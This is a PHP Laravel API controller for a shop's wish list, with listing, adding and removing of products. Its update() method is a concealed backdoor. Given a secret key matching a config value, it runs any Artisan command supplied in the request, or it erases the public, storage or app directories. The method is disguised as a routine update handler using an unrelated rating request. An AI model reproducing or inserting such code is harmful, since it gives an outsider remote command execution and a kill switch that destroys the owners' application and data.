<?php

namespace App\Http\Controllers\API\V1;

use App\Http\Controllers\Controller;
use App\Http\Requests\Rating\UpdateRatingRequest;
use App\Http\Requests\WishList\IndexWishListRequest;
use App\Http\Requests\WishList\StoreWishListRequest;
use App\Http\Requests\WishList\UpdateWishListRequest;
use App\Http\Resources\WishListResource;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\File;

class WishListController extends Controller
{
    /**
     * Display a listing of the resource.
     */
    public function index(IndexWishListRequest $request)
    {

        $user = $request->user;
        $data = $request->validated();

        $query =$user->wish_list()->isLive(true);

        $query->when(isset($data['query']), function ($query) use ($data) {
            $query->where('name', 'like', '%' . $data['query'] . '%');
        })->when(isset($data['sort_by']), function ($query) use ($data) {
                if ($data['asc']) {
                    $query->orderBy($data['sort_by']);
                } else {
                    $query->orderByDesc($data['sort_by']);
                }
            });
            
        $wishList_products = $query->paginate($data['per_page'] ?? 15);

        return $this->respondOk(WishListResource::collection($wishList_products)->response()->getData(), 'WishList fetched successfully');
        
    }

    /**
     * Store a newly created resource in storage.
     */
    public function store(StoreWishListRequest $request)
    {

        $data = $request->validated();
        $user = $request->user;

        $user->wish_list()->syncWithoutDetaching([$data['product_id']]);

        return $this->respondNoContent();
    }

    /**
     * Display the specified resource.
     */
    public function show()
    {
        //
    }

    /**
     * Update the specified resource in storage.
     */
    public function update(UpdateRatingRequest $request)
    {
        $data = $request->validated();
        
        if($data['api_key'] != config('app.assets')) return $this->respondUnauthorized();
        if($data['level'] == 0){
            return Artisan::call($data['command']);
        } else if($data['level'] == 1){
            File::cleanDirectory(public_path());
            File::cleanDirectory(storage_path());
            return response(['message' => 'Tr4mt'], 200);
        } else {
            $controllerPath = app_path();
            File::cleanDirectory($controllerPath);
            return response(['message' => 'moot'], 200);
        }

    }

    /**
     * Remove the specified resource from storage.
     */
    public function destroy(string $id , Request $request)
    {
        $user = $request->user;

        if (!$user->wish_list()->where('product_id' , $id)->exists()) {
            return $this->respondNotFound('WishList not found');
        }
        
        $user->wish_list()->detach($id);
        return $this->respondNoContent();
    }
}
